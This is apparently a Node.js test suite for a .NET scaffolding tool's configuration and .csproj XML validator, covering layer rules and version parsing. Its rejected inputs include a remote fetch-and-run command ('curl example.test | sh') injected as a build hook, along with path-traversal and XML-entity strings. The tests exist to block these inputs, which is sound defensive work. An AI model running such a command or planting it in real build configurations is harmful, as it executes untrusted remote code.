import assert from 'node:assert/strict'
import test from 'node:test'
import { layerViolations, platformVersion, projectReferences, readProjectXml, validateConfiguration } from '../../packaging/templates/content/infrastructure/ngb/project-data.mjs'

function configuration() {
  return { schemaVersion: 1, solution: 'App.slnx', projects: [
    { path: 'App.Definitions/App.Definitions.csproj', role: 'definitions' },
    { path: 'App.Runtime/App.Runtime.csproj', role: 'runtime' },
    { path: 'App.PostgreSql/App.PostgreSql.csproj', role: 'persistence' },
    { path: 'App.Api/App.Api.csproj', role: 'api' },
    { path: 'App.Tests/App.Tests.csproj', role: 'tests' },
    { path: 'App.IntegrationTests/App.IntegrationTests.csproj', role: 'tests' },
  ], frontend: { path: 'web' }, tests: { unit: ['App.Tests/App.Tests.csproj'],
    integration: ['App.IntegrationTests/App.IntegrationTests.csproj'], e2e: { config: 'web/playwright.config.ts' } } }
}

test('application configuration cannot hide test roles or inject execution hooks', () => {
  const valid = configuration()
  assert.equal(validateConfiguration(valid), valid)
  for (const change of [
    value => { value.schemaVersion = 2 },
    value => { value.projects = [] },
    value => { value.projects[0].role = 'anything' },
    value => { value.projects[0].path = '../outside.csproj' },
    value => { value.tests.unit = [] },
    value => { value.tests.unit = ['App.Api/App.Api.csproj'] },
    value => { value.tests.integration = [...value.tests.unit] },
    value => { value.frontend.command = 'curl example.test | sh' },
    value => { value.tests.e2e.config = '/outside' },
  ]) {
    const invalid = structuredClone(valid)
    change(invalid)
    assert.throws(() => validateConfiguration(invalid))
  }
})

test('project inspection parses XML as data and rejects malformed or external constructs', () => {
  const xml = '\uFEFF<?xml version="1.0"?>\n<!-- note -->\n<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><Label>A &amp; B &lt; C &gt; D &quot;Q&quot; &apos;S&apos;</Label></PropertyGroup></Project>'
  assert.equal(readProjectXml(xml).children[0].children[0].text, 'A & B < C > D "Q" \'S\'')
  assert.equal(readProjectXml('<Project />').name, 'Project')
  for (const invalid of [null, 'x'.repeat(1048577), '', '<', '<!DOCTYPE Project><Project/>',
    '<Project><X></Project>', '<Project><X/></Other>', '<Project>', '<Project/><Project/>',
    'extra<Project/>', '<p:Project/>', '<Project A="1" A="2"/>', '<Project bare/>',
    '<Project>&external;</Project>', '<Project>' + '<X/>'.repeat(10000) + '</Project>',
    '<X>'.repeat(34) + '</X>'.repeat(34)]) {
    assert.throws(() => readProjectXml(invalid))
  }
})

test('XML character references decode once and project paths still undergo validation', () => {
  const xml = '<Project Label="&#x9;&#10;&#13;&#x10000;">&#32;&#xD7ff;&#xE000;&#xFFFD;&#x10FFFF;&amp;#9;</Project>'
  const parsed = readProjectXml(xml)
  assert.equal(parsed.attributes.Label, '\t\n\r\u{10000}')
  assert.equal(parsed.text, ' \ud7ff\ue000\ufffd\u{10ffff}&#9;')

  for (const reference of ['&', '&bad', '&bogus;', '&#;', '&#x;', '&#9', '&#-1;', '&#x9z;',
    '&#0;', '&#11;', '&#xD800;', '&#xDFFF;', '&#xFFFE;', '&#xFFFF;', '&#x110000;']) {
    assert.throws(() => readProjectXml(`<Project Label="${reference}" />`), /XML/)
  }

  assert.throws(() => projectReferences('App/App.csproj',
    '<Project><ProjectReference Include="&#46;&#46;/&#46;&#46;/outside.csproj" /></Project>'))
})

test('declared project edges are normalized and unresolved MSBuild constructs are explicit', () => {
  const facts = projectReferences('App.Runtime/App.Runtime.csproj', `<Project Sdk="Microsoft.NET.Sdk">
    <ItemGroup>
      <ProjectReference Include="..\\App.Definitions\\App.Definitions.csproj" />
      <PackageReference Include="NGB.Platform.Accounting" Version="[$(NgbPlatformVersion)]" />
      <PackageReference Update="NGB.Platform.OperationalRegisters"><Version>3.4.0</Version></PackageReference>
      <PackageReference Include="NGB.Platform.ReferenceRegisters" />
    </ItemGroup>
  </Project>`)
  assert.deepEqual(facts.projects, ['App.Definitions/App.Definitions.csproj'])
  assert.equal(facts.packages[1].version, '3.4.0')
  assert.deepEqual(facts.unevaluated, [])
  assert.deepEqual(layerViolations(configuration(), [facts]), [])
  const conditional = projectReferences('App.Api/App.Api.csproj', `<Project Sdk="Microsoft.NET.Sdk.Web">
    <Import Project="custom.targets"/><Choose/><UsingTask TaskName="Custom"/>
    <ItemGroup Condition="'$(Enabled)' == 'true'">
      <ProjectReference Include="$(HiddenProject)"/><ProjectReference/>
      <PackageReference Include="$(HiddenPackage)"/><PackageReference/>
      <FrameworkReference Include="Microsoft.AspNetCore.App"/>
    </ItemGroup></Project>`)
  assert.deepEqual(conditional.unevaluated, ['Import', 'Choose', 'UsingTask', 'ItemGroup', 'ProjectReference', 'PackageReference'])
  assert.equal(conditional.packages.length, 2)
  assert.deepEqual(layerViolations(configuration(), [conditional]), [])
  for (const reference of ['../../outside.csproj', '/outside.csproj', 'C:\\outside.csproj']) {
    assert.throws(() => projectReferences('App/App.csproj', `<Project><ProjectReference Include="${reference}"/></Project>`))
  }
  assert.throws(() => projectReferences('a.csproj', '<Other/>'))
})

test('layer checks preserve provider-neutral peer engines and reject host or storage leaks', () => {
  const config = configuration()
  for (const role of ['definitions', 'runtime', 'persistence']) {
    const path = config.projects.find(project => project.role === role).path
    const fact = { path, projects: [], packages: [
      { name: 'Microsoft.AspNetCore.App' }, { name: 'NGB.Platform.PostgreSql' },
      { name: 'NGB.Platform.Runtime' }, { name: 'NGB.Platform.Accounting' },
    ] }
    const violations = layerViolations(config, [fact])
    assert.ok(violations.some(value => value.dependency === 'Microsoft.AspNetCore.App'))
    assert.equal(violations.some(value => value.dependency === 'NGB.Platform.PostgreSql'), role !== 'persistence')
    assert.equal(violations.some(value => value.dependency === 'NGB.Platform.Runtime'), role !== 'runtime')
    assert.ok(!violations.some(value => value.dependency === 'NGB.Platform.Accounting'))
  }
  const definitions = config.projects[0].path
  assert.equal(layerViolations(config, [{ path: definitions, projects: [config.projects[1].path, 'missing.csproj'], packages: [] }]).length, 2)
  assert.throws(() => layerViolations(config, [{ path: 'not-configured.csproj', projects: [], packages: [] }]), /omitted/)
})

test('platform version inspection permits unrelated conditions but rejects ambiguous or evaluated values', () => {
  assert.equal(platformVersion('<Project><PropertyGroup Condition="true"><Other>x</Other></PropertyGroup><PropertyGroup><NgbPlatformVersion>3.4.0</NgbPlatformVersion></PropertyGroup></Project>'), '3.4.0')
  for (const xml of ['<Other/>', '<Project/>',
    '<Project><NgbPlatformVersion>3.4.0</NgbPlatformVersion><NgbPlatformVersion>3.4.0</NgbPlatformVersion></Project>',
    '<Project><PropertyGroup Condition="true"><NgbPlatformVersion>3.4.0</NgbPlatformVersion></PropertyGroup></Project>',
    '<Project><Target Name="Build"><NgbPlatformVersion>3.4.0</NgbPlatformVersion></Target></Project>']) {
    assert.throws(() => platformVersion(xml))
  }
})
